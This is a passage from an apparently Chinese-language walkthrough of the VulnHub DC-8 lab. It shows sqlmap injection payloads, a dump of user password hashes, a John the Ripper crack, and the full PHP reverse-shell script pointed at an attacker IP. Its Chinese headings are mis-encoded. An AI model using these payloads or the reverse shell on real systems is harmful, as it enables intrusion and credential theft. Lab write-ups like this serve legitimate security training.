rdf_mapping                 |</span></span><br><span class="line"><span class="string">| registry                    |</span></span><br><span class="line"><span class="string">| registry_file               |</span></span><br><span class="line"><span class="string">| role                        |</span></span><br><span class="line"><span class="string">| role_permission             |</span></span><br><span class="line"><span class="string">| search_dataset              |</span></span><br><span class="line"><span class="string">| search_index                |</span></span><br><span class="line"><span class="string">| search_node_links           |</span></span><br><span class="line"><span class="string">| search_total                |</span></span><br><span class="line"><span class="string">| semaphore                   |</span></span><br><span class="line"><span class="string">| sequences                   |</span></span><br><span class="line"><span class="string">| sessions                    |</span></span><br><span class="line"><span class="string">| shortcut_set                |</span></span><br><span class="line"><span class="string">| shortcut_set_users          |</span></span><br><span class="line"><span class="string">| site_messages_table         |</span></span><br><span class="line"><span class="string">| taxonomy_index              |</span></span><br><span class="line"><span class="string">| taxonomy_term_data          |</span></span><br><span class="line"><span class="string">| taxonomy_term_hierarchy     |</span></span><br><span class="line"><span class="string">| taxonomy_vocabulary         |</span></span><br><span class="line"><span class="string">| url_alias                   |</span></span><br><span class="line"><span class="string">| users                       |</span></span><br><span class="line"><span class="string">| users_roles                 |</span></span><br><span class="line"><span class="string">| variable                    |</span></span><br><span class="line"><span class="string">| views_display               |</span></span><br><span class="line"><span class="string">| views_view                  |</span></span><br><span class="line"><span class="string">| watchdog                    |</span></span><br><span class="line"><span class="string">| webform                     |</span></span><br><span class="line"><span class="string">| webform_component           |</span></span><br><span class="line"><span class="string">| webform_conditional         |</span></span><br><span class="line"><span class="string">| webform_conditional_actions |</span></span><br><span class="line"><span class="string">| webform_conditional_rules   |</span></span><br><span class="line"><span class="string">| webform_emails              |</span></span><br><span class="line"><span class="string">| webform_last_download       |</span></span><br><span class="line"><span class="string">| webform_roles               |</span></span><br><span class="line"><span class="string">| webform_submissions         |</span></span><br><span class="line"><span class="string">| webform_submitted_data      |</span></span><br><span class="line"><span class="string">+-----------------------------+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[20:59:55] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/192.168.1.3&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 20:59:55 /2020-08-30/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root@JIYE:~/vulnhub/dc8# </span></span><br></pre></td></tr></table></figure>

<h2 id="0x06-çˆ†å­—æ®µ"><a href="#0x06-çˆ†å­—æ®µ" class="headerlink" title="0x06.çˆ†å­—æ®µ"></a>0x06.çˆ†å­—æ®µ</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc8<span class="comment"># sqlmap -u &quot;http://192.168.1.3/?nid=2&quot; -D &quot;d7db&quot; -T &quot;users&quot; --columns</span></span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[.]_____ ___ ___  &#123;1.4.8<span class="comment">#stable&#125;</span></span><br><span class="line">|_ -| . [<span class="string">&#x27;]     | .&#x27;</span>| . |</span><br><span class="line">|___|_  [,]_|_|_|__,|  _|</span><br><span class="line">      |_|V...       |_|   http://sqlmap.org</span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap <span class="keyword">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="string">&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 21:04:47 /2020-08-30/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[21:04:47] [INFO] resuming back-end DBMS &#x27;</span>mysql<span class="string">&#x27; </span></span><br><span class="line"><span class="string">[21:04:47] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: nid (GET)</span></span><br><span class="line"><span class="string">    Type: boolean-based blind</span></span><br><span class="line"><span class="string">    Title: AND boolean-based blind - WHERE or HAVING clause</span></span><br><span class="line"><span class="string">    Payload: nid=2 AND 2744=2744</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: error-based</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span></span><br><span class="line"><span class="string">    Payload: nid=2 AND (SELECT 3788 FROM(SELECT COUNT(*),CONCAT(0x7162766b71,(SELECT (ELT(3788=3788,1))),0x716a6a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: nid=2 AND (SELECT 8090 FROM (SELECT(SLEEP(5)))vgpi)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: Generic UNION query (NULL) - 1 column</span></span><br><span class="line"><span class="string">    Payload: nid=-6424 UNION ALL SELECT CONCAT(0x7162766b71,0x756e745669426f51657542734855636c72567a796d6a4f4f4642425451696b77557152776b6f616c,0x716a6a7671)-- -</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[21:04:47] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0 (MariaDB fork)</span></span><br><span class="line"><span class="string">[21:04:47] [INFO] fetching columns for table &#x27;</span>users<span class="string">&#x27; in database &#x27;</span>d7db<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[21:04:47] [INFO] retrieved: &#x27;</span>uid<span class="string">&#x27;,&#x27;</span>int(10) unsigned<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[21:04:47] [INFO] retrieved: &#x27;</span>name<span class="string">&#x27;,&#x27;</span>varchar(60)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[21:04:47] [INFO] retrieved: &#x27;</span>pass<span class="string">&#x27;,&#x27;</span>varchar(128)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[21:04:47] [INFO] retrieved: &#x27;</span>mail<span class="string">&#x27;,&#x27;</span>varchar(254)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[21:04:47] [INFO] retrieved: &#x27;</span>theme<span class="string">&#x27;,&#x27;</span>varchar(255)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[21:04:48] [INFO] retrieved: &#x27;</span>signature<span class="string">&#x27;,&#x27;</span>varchar(255)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[21:04:48] [INFO] retrieved: &#x27;</span>signature_format<span class="string">&#x27;,&#x27;</span>varchar(255)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[21:04:48] [INFO] retrieved: &#x27;</span>created<span class="string">&#x27;,&#x27;</span>int(11)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[21:04:48] [INFO] retrieved: &#x27;</span>access<span class="string">&#x27;,&#x27;</span>int(11)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[21:04:48] [INFO] retrieved: &#x27;</span>login<span class="string">&#x27;,&#x27;</span>int(11)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[21:04:48] [INFO] retrieved: &#x27;</span>status<span class="string">&#x27;,&#x27;</span>tinyint(4)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[21:04:48] [INFO] retrieved: &#x27;</span>timezone<span class="string">&#x27;,&#x27;</span>varchar(32)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[21:04:48] [INFO] retrieved: &#x27;</span>language<span class="string">&#x27;,&#x27;</span>varchar(12)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[21:04:48] [INFO] retrieved: &#x27;</span>picture<span class="string">&#x27;,&#x27;</span>int(11)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[21:04:48] [INFO] retrieved: &#x27;</span>init<span class="string">&#x27;,&#x27;</span>varchar(254)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[21:04:48] [INFO] retrieved: &#x27;</span>data<span class="string">&#x27;,&#x27;</span>longblob<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Database: d7db                                                                                                                                   </span></span><br><span class="line"><span class="string">Table: users</span></span><br><span class="line"><span class="string">[16 columns]</span></span><br><span class="line"><span class="string">+------------------+------------------+</span></span><br><span class="line"><span class="string">| Column           | Type             |</span></span><br><span class="line"><span class="string">+------------------+------------------+</span></span><br><span class="line"><span class="string">| language         | varchar(12)      |</span></span><br><span class="line"><span class="string">| access           | int(11)          |</span></span><br><span class="line"><span class="string">| created          | int(11)          |</span></span><br><span class="line"><span class="string">| data             | longblob         |</span></span><br><span class="line"><span class="string">| init             | varchar(254)     |</span></span><br><span class="line"><span class="string">| login            | int(11)          |</span></span><br><span class="line"><span class="string">| mail             | varchar(254)     |</span></span><br><span class="line"><span class="string">| name             | varchar(60)      |</span></span><br><span class="line"><span class="string">| pass             | varchar(128)     |</span></span><br><span class="line"><span class="string">| picture          | int(11)          |</span></span><br><span class="line"><span class="string">| signature        | varchar(255)     |</span></span><br><span class="line"><span class="string">| signature_format | varchar(255)     |</span></span><br><span class="line"><span class="string">| status           | tinyint(4)       |</span></span><br><span class="line"><span class="string">| theme            | varchar(255)     |</span></span><br><span class="line"><span class="string">| timezone         | varchar(32)      |</span></span><br><span class="line"><span class="string">| uid              | int(10) unsigned |</span></span><br><span class="line"><span class="string">+------------------+------------------+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[21:04:48] [INFO] fetched data logged to text files under &#x27;</span>/root/.<span class="built_in">local</span>/share/sqlmap/output/192.168.1.3<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 21:04:48 /2020-08-30/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root@JIYE:~/vulnhub/dc8# </span></span><br></pre></td></tr></table></figure>

<h2 id="0x06-çˆ†æ•°æ®ï¼Œä½†æ˜¯æ˜¯hashçš„"><a href="#0x06-çˆ†æ•°æ®ï¼Œä½†æ˜¯æ˜¯hashçš„" class="headerlink" title="0x06.çˆ†æ•°æ®ï¼Œä½†æ˜¯æ˜¯hashçš„"></a>0x06.çˆ†æ•°æ®ï¼Œä½†æ˜¯æ˜¯hashçš„</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc8<span class="comment"># sqlmap -u &quot;http://192.168.1.3/?nid=2&quot; -D &quot;d7db&quot; -T &quot;users&quot; -C &quot;name,pass&quot; --dump</span></span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[.]_____ ___ ___  &#123;1.4.8<span class="comment">#stable&#125;</span></span><br><span class="line">|_ -| . [<span class="string">&#x27;]     | .&#x27;</span>| . |</span><br><span class="line">|___|_  [<span class="string">&#x27;]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;</span>s responsibility to obey all applicable <span class="built_in">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="keyword">for</span> any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 21:06:17 /2020-08-30/</span><br><span class="line"></span><br><span class="line">[21:06:17] [INFO] resuming back-end DBMS <span class="string">&#x27;mysql&#x27;</span> </span><br><span class="line">[21:06:17] [INFO] testing connection to the target URL</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: nid (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: nid=2 AND 2744=2744</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span><br><span class="line">    Payload: nid=2 AND (SELECT 3788 FROM(SELECT COUNT(*),CONCAT(0x7162766b71,(SELECT (ELT(3788=3788,1))),0x716a6a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: nid=2 AND (SELECT 8090 FROM (SELECT(SLEEP(5)))vgpi)</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 1 column</span><br><span class="line">    Payload: nid=-6424 UNION ALL SELECT CONCAT(0x7162766b71,0x756e745669426f51657542734855636c72567a796d6a4f4f4642425451696b77557152776b6f616c,0x716a6a7671)-- -</span><br><span class="line">---</span><br><span class="line">[21:06:17] [INFO] the back-end DBMS is MySQL</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0 (MariaDB fork)</span><br><span class="line">[21:06:17] [INFO] fetching entries of column(s) <span class="string">&#x27;name, pass&#x27;</span> <span class="keyword">for</span> table <span class="string">&#x27;users&#x27;</span> <span class="keyword">in</span> database <span class="string">&#x27;d7db&#x27;</span></span><br><span class="line">[21:06:17] [INFO] retrieved: <span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span></span><br><span class="line">[21:06:18] [INFO] retrieved: <span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;$S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z&#x27;</span></span><br><span class="line">[21:06:18] [INFO] retrieved: <span class="string">&#x27;john&#x27;</span>,<span class="string">&#x27;$S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF&#x27;</span></span><br><span class="line">Database: d7db                                                                                                                                   </span><br><span class="line">Table: users</span><br><span class="line">[2 entries]</span><br><span class="line">+-------+---------------------------------------------------------+</span><br><span class="line">| name  | pass                                                    |</span><br><span class="line">+-------+---------------------------------------------------------+</span><br><span class="line">| admin | <span class="variable">$S</span><span class="variable">$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z</span> |</span><br><span class="line">| john  | <span class="variable">$S</span><span class="variable">$DqupvJbxVmqjr6cYePnx2A891ln7lsuku</span>/3if/oRVZJaz5mKC2vF |</span><br><span class="line">+-------+---------------------------------------------------------+</span><br><span class="line"></span><br><span class="line">[21:06:18] [INFO] table <span class="string">&#x27;d7db.users&#x27;</span> dumped to CSV file <span class="string">&#x27;/root/.local/share/sqlmap/output/192.168.1.3/dump/d7db/users.csv&#x27;</span></span><br><span class="line">[21:06:18] [INFO] fetched data logged to text files under <span class="string">&#x27;/root/.local/share/sqlmap/output/192.168.1.3&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] ending @ 21:06:18 /2020-08-30/</span><br><span class="line"></span><br><span class="line">root@JIYE:~/vulnhub/dc8<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h2 id="0x07-johnè§£è¿·"><a href="#0x07-johnè§£è¿·" class="headerlink" title="0x07.johnè§£è¿·"></a>0x07.johnè§£è¿·</h2><p><code>å…ˆç”Ÿæˆå­—å…¸</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc8<span class="comment"># cat user.dic </span></span><br><span class="line">admin:<span class="variable">$S</span><span class="variable">$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z</span></span><br><span class="line">john:<span class="variable">$S</span><span class="variable">$DqupvJbxVmqjr6cYePnx2A891ln7lsuku</span>/3if/oRVZJaz5mKC2vF</span><br><span class="line">root@JIYE:~/vulnhub/dc8<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><code>è§£å¯†ï¼Œjohnçš„å¯†ç ä¸ºturtle</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc8<span class="comment"># john user.txt /usr/share/wordlists/rockyou.txt</span></span><br><span class="line">Â·Â·Â·</span><br><span class="line">æ­¤å¤„çœç•¥nè¡Œ</span><br><span class="line">Â·Â·Â·</span><br><span class="line">root@JIYE:~/vulnhub/dc8<span class="comment"># john user.txt /usr/share/wordlists/rockyou.txt --show</span></span><br><span class="line">john:turtle</span><br><span class="line">Session aborted</span><br><span class="line">root@JIYE:~/vulnhub/dc8<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h2 id="0x08-ç™»å…¥"><a href="#0x08-ç™»å…¥" class="headerlink" title="0x08.ç™»å…¥"></a>0x08.ç™»å…¥</h2><p><code>æ‰¾äº†ä¸€åœˆå‘ç°å¯ä»¥å†™PHPä»£ç </code></p>
<img src="/2020/08/31/DC-8/image-20200831095038841.png" class>

<h2 id="0x09-åå¼¹shell"><a href="#0x09-åå¼¹shell" class="headerlink" title="0x09.åå¼¹shell"></a>0x09.åå¼¹shell</h2><p><code>æœ¬æ¬¡ä½¿ç”¨/usr/share/webshells/php/php-reverse-shell.php</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// php-reverse-shell - A Reverse Shell implementation <span class="keyword">in</span> PHP</span><br><span class="line">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span><br><span class="line">//</span><br><span class="line">// This tool may be used <span class="keyword">for</span> legal purposes only.  Users take full responsibility</span><br><span class="line">// <span class="keyword">for</span> any actions performed using this tool.  The author accepts no liability</span><br><span class="line">// <span class="keyword">for</span> damage caused by this tool.  If these terms are not acceptable to you, <span class="keyword">then</span></span><br><span class="line">// <span class="keyword">do</span> not use this tool.</span><br><span class="line">//</span><br><span class="line">// In all other respects the GPL version 2 applies:</span><br><span class="line">//</span><br><span class="line">// This program is free software; you can redistribute it and/or modify</span><br><span class="line">// it under the terms of the GNU General Public License version 2 as</span><br><span class="line">// published by the Free Software Foundation.</span><br><span class="line">//</span><br><span class="line">// This program is distributed <span class="keyword">in</span> the hope that it will be useful,</span><br><span class="line">// but WITHOUT ANY WARRANTY; without even the implied warranty of</span><br><span class="line">// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span><br><span class="line">// GNU General Public License <span class="keyword">for</span> more details.</span><br><span class="line">//</span><br><span class="line">// You should have received a copy of the GNU General Public License along</span><br><span class="line">// with this program; <span class="keyword">if</span> not, write to the Free Software Foundation, Inc.,</span><br><span class="line">// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</span><br><span class="line">//</span><br><span class="line">// This tool may be used <span class="keyword">for</span> legal purposes only.  Users take full responsibility</span><br><span class="line">// <span class="keyword">for</span> any actions performed using this tool.  If these terms are not acceptable to</span><br><span class="line">// you, <span class="keyword">then</span> <span class="keyword">do</span> not use this tool.</span><br><span class="line">//</span><br><span class="line">// You are encouraged to send comments, improvements or suggestions to</span><br><span class="line">// me at pentestmonkey@pentestmonkey.net</span><br><span class="line">//</span><br><span class="line">// Description</span><br><span class="line">// -----------</span><br><span class="line">// This script will make an outbound TCP connection to a hardcoded IP and port.</span><br><span class="line">// The recipient will be given a shell running as the current user (apache normally).</span><br><span class="line">//</span><br><span class="line">// Limitations</span><br><span class="line">// -----------</span><br><span class="line">// proc_open and stream_set_blocking require PHP version 4.3+, or 5+</span><br><span class="line">// Use of stream_select() on file descriptors returned by proc_open() will fail and <span class="built_in">return</span> FALSE under Windows.</span><br><span class="line">// Some compile-time options are needed <span class="keyword">for</span> daemonisation (like pcntl, posix).  These are rarely available.</span><br><span class="line">//</span><br><span class="line">// Usage</span><br><span class="line">// -----</span><br><span class="line">// See http://pentestmonkey.net/tools/php-reverse-shell <span class="keyword">if</span> you get stuck.</span><br><span class="line"></span><br><span class="line">set_time_limit (0);</span><br><span class="line"><span class="variable">$VERSION</span> = <span class="string">&quot;1.0&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="string">&#x27;192.168.1.6&#x27;</span>;  // CHANGE THIS</span><br><span class="line"><span class="variable">$port</span> = 1234;       // CHANGE THIS</span><br><span class="line"><span class="variable">$chunk_size</span> = 1400;</span><br><span class="line"><span class="variable">$write_a</span> = null;</span><br><span class="line"><span class="variable">$error_a</span> = null;</span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&#x27;uname -a; w; id; /bin/sh -i&#x27;</span>;</span><br><span class="line"><span class="variable">$daemon</span> = 0;</span><br><span class="line"><span class="variable">$debug</span> = 0;</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">// Daemonise ourself <span class="keyword">if</span> possible to avoid zombies later</span><br><span class="line">//</span><br><span class="line"></span><br><span class="line">// pcntl_fork is hardly ever available, but will allow us to daemonise</span><br><span class="line">// our php process and avoid zombies.  Worth a try...</span><br><span class="line"><span class="keyword">if</span> (function_exists(<span class="string">&#x27;pcntl_fork&#x27;</span>)) &#123;</span><br><span class="line">        // Fork and have the parent process <span class="built_in">exit</span></span><br><span class="line">        <span class="variable">$pid</span> = pcntl_fork();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$pid</span> == -1) &#123;</span><br><span class="line">                printit(<span class="string">&quot;ERROR: Can&#x27;t fork&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(1);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$pid</span>) &#123;</span><br><span class="line">                <span class="built_in">exit</span>(0);  // Parent exits</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // Make the current process a session leader</span><br><span class="line">        // Will only succeed <span class="keyword">if</span> we forked</span><br><span class="line">        <span class="keyword">if</span> (posix_setsid() == -1) &#123;</span><br><span class="line">                printit(<span class="string">&quot;Error: Can&#x27;t setsid()&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(1);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$daemon</span> = 1;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        printit(<span class="string">&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Change to a safe directory</span><br><span class="line"><span class="built_in">chdir</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"></span><br><span class="line">// Remove any <span class="built_in">umask</span> we inherited</span><br><span class="line"><span class="built_in">umask</span>(0);</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">// Do the reverse shell...</span><br><span class="line">//</span><br><span class="line"></span><br><span class="line">// Open reverse connection</span><br><span class="line"><span class="variable">$sock</span> = fsockopen(<span class="variable">$ip</span>, <span class="variable">$port</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, 30);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$sock</span>) &#123;</span><br><span class="line">        printit(<span class="string">&quot;<span class="variable">$errstr</span> (<span class="variable">$errno</span>)&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Spawn shell process</span><br><span class="line"><span class="variable">$descriptorspec</span> = array(</span><br><span class="line">   0 =&gt; array(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;r&quot;</span>),  // stdin is a pipe that the child will <span class="built_in">read</span> from</span><br><span class="line">   1 =&gt; array(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>),  // stdout is a pipe that the child will write to</span><br><span class="line">   2 =&gt; array(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>)   // stderr is a pipe that the child will write to</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$process</span> = proc_open(<span class="variable">$shell</span>, <span class="variable">$descriptorspec</span>, <span class="variable">$pipes</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_resource(<span class="variable">$process</span>)) &#123;</span><br><span class="line">        printit(<span class="string">&quot;ERROR: Can&#x27;t spawn shell&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Set everything to non-blocking</span><br><span class="line">// Reason: Occsionally reads will block, even though stream_select tells us they won<span class="string">&#x27;t</span></span><br><span class="line"><span class="string">stream_set_blocking($pipes[0], 0);</span></span><br><span class="line"><span class="string">stream_set_blocking($pipes[1], 0);</span></span><br><span class="line"><span class="string">stream_set_blocking($pipes[2], 0);</span></span><br><span class="line"><span class="string">stream_set_blocking($sock, 0);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">printit(&quot;Successfully opened reverse shell to $ip:$port&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">while (1) &#123;</span></span><br><span class="line"><span class="string">        // Check for end of TCP connection</span></span><br><span class="line"><span class="string">        if (feof($sock)) &#123;</span></span><br><span class="line"><span class="string">                printit(&quot;ERROR: Shell connection terminated&quot;);</span></span><br><span class="line"><span class="string">                break;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        // Check for end of STDOUT</span></span><br><span class="line"><span class="string">        if (feof($pipes[1])) &#123;</span></span><br><span class="line"><span class="string">                printit(&quot;ERROR: Shell process terminated&quot;);</span></span><br><span class="line"><span class="string">                break;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        // Wait until a command is end down $sock, or some</span></span><br><span class="line"><span class="string">        // command output is available on STDOUT or STDERR</span></span><br><span class="line"><span class="string">        $read_a = array($sock, $pipes[1], $pipes[2]);</span></span><br><span class="line"><span class="string">        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        // If we can read from the TCP socket, send</span></span><br><span class="line"><span class="string">        // data to process&#x27;</span>s STDIN</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$sock</span>, <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$debug</span>) printit(<span class="string">&quot;SOCK READ&quot;</span>);</span><br><span class="line">                <span class="variable">$input</span> = fread(<span class="variable">$sock</span>, <span class="variable">$chunk_size</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$debug</span>) printit(<span class="string">&quot;SOCK: <span class="variable">$input</span>&quot;</span>);</span><br><span class="line">                fwrite(<span class="variable">$pipes</span>[0], <span class="variable">$input</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // If we can <span class="built_in">read</span> from the process<span class="string">&#x27;s STDOUT</span></span><br><span class="line"><span class="string">        // send data down tcp connection</span></span><br><span class="line"><span class="string">        if (in_array($pipes[1], $read_a)) &#123;</span></span><br><span class="line"><span class="string">                if ($debug) printit(&quot;STDOUT READ&quot;);</span></span><br><span class="line"><span class="string">                $input = fread($pipes[1], $chunk_size);</span></span><br><span class="line"><span class="string">                if ($debug) printit(&quot;STDOUT: $input&quot;);</span></span><br><span class="line"><span class="string">                fwrite($sock, $input);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        // If we can read from the process&#x27;</span>s STDERR</span><br><span class="line">        // send data down tcp connection</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$pipes</span>[2], <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$debug</span>) printit(<span class="string">&quot;STDERR READ&quot;</span>);</span><br><span class="line">                <span class="variable">$input</span> = fread(<span class="variable">$pipes</span>[2], <span class="variable">$chunk_size</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$debug</span>) printit(<span class="string">&quot;STDERR: <span class="variable">$input</span>&quot;</span>);</span><br><span class="line">                fwrite(<span class="variable">$sock</span>, <span class="variable">$input</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fclose(<span class="variable">$sock</span>);</span><br><span class="line">fclose(<span class="variable">$pipes</span>[0]);</span><br><span class="line">fclose(<span class="variable">$pipes</span>[1]);</span><br><span class="line">fclose(<span class="variable">$pipes</span>[2]);</span><br><span class="line">proc_close(<span class="variable">$process</span>);</span><br><span class="line"></span><br><span class="line">// Like <span class="built_in">print</span>, but does nothing <span class="keyword">if</span> we<span class="string">&#x27;ve daemonised ourself</span></span><br><span class="line"><span class="string">// (I can&#x27;</span>t figure out how to redirect STDOUT like a proper daemon)</span><br><span class="line"><span class="keyword">function</span> printit (<span class="variable">$string</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$daemon</span>) &#123;</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&quot;<span class="variable">$string</span>\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><code>ç¼–è¾‘</code></p>
<img src="/2020/08/31/DC-8/image-20200831095432503.png" class>

<p><code>ä¿å­˜</code></p>
<img src="/2020/08/31/DC-8/image-20200831095500070.png" class>

<p><code>kaliç›‘å¬</code></p>
